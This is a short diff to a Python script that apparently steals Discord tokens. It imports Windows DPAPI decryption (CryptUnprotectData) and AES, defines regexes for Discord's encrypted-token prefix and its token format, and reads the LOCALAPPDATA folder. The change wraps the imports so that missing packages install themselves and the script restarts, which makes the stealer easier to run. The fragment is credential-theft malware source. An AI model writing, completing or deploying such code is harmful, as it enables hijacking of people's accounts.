@@ -1,7 +1,12 @@
-import os, re, requests, json, ntpath
-from Cryptodome.Cipher import AES
-from base64 import b64decode
-from win32crypt import CryptUnprotectData
+from modules import package
+try:
+    import os, re, requests, json, ntpath
+    from Cryptodome.Cipher import AES
+    from base64 import b64decode
+    from win32crypt import CryptUnprotectData
+except ImportError as e:
+    package.install_module(e.name)
+    package.restart()
 encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 LOCAL = os.getenv("LOCALAPPDATA")
